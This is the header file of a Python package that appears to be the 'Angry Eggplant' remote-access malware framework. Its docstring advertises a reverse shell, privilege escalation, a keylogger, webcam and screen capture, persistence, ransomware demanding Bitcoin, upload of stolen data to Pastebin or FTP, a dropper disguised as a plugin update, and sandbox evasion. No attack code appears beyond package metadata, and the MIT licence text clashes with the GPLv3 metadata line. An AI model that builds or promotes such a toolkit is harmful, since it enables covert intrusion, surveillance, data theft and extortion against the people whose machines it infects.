#!/usr/bin/python
#
#    Copyright (c) 2017 Daniel Vega-Myhre
#
#    Permission is hereby granted, free of charge, to any person obtaining a copy
#    of this software and associated documentation files (the "Software"), to deal
#    in the Software without restriction, including without limitation the rights
#    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#    copies of the Software, and to permit persons to whom the Software is
#    furnished to do so, subject to the following conditions:
#
#    THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
#    COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.
#
#    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
#
#    IN NO EVENT SHALL THE
#    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#    SOFTWARE.

'''

   The Angry Eggplant Project (https://github.com/colental/ae)
    
>  30+ modules - interactive & automated
    - Reverse Shell   remotely access host machine with a shell
    - Root Acess      obtain administrator privileges
    - Keylogger       log user keystrokes with the window they were entered in
    - Webcam          capture image/video or stream live
    - Screenshot      snap shots of the host desktop
    - Persistence     maintain access with 8 different persistence methods
    - Packetsniffer   monitor host network traffic for valuable information
    - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
    - Ransom          encrypt host files and ransom them to the user for Bitcoin
    - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
    - Email           Outlook email of a logged in user can be accessed without authentication
    - SMS             Send & receive SMS text messages with user's contacts
    
>  Portability - supports all major platforms & architectures
    - no configuration - dynamically generates a unique client configured for the host
    - no dependencies - packages, interpreter & modules all loaded remotely
    - multiple file types - .exe (Windows), .sh (Linux) .app (Mac OS X), .apk (Android)
    - normal mode - dropper is executable or application and disguised as plugin update
    - fileless mode - everything loaded remotely, never exists on disk 
    
>  Security
    - state of the art encryption - AES cipher in authenticated OCB mode with 256-bit key
    - Diffie-Hellman Key Agreement - key is secure even on monitored networks
    - secure communication - message confidentiality, authenticity, & integrity
    - anti-forensics countermeasures - sandbox detection, virtual machine detection

'''


__all__ 	= ['client', 'payload', 'server']
__author__ 	= 'Daniel Vega-Myhre'
__license__ 	= 'GPLv3'
__version__ 	= '0.4.7'
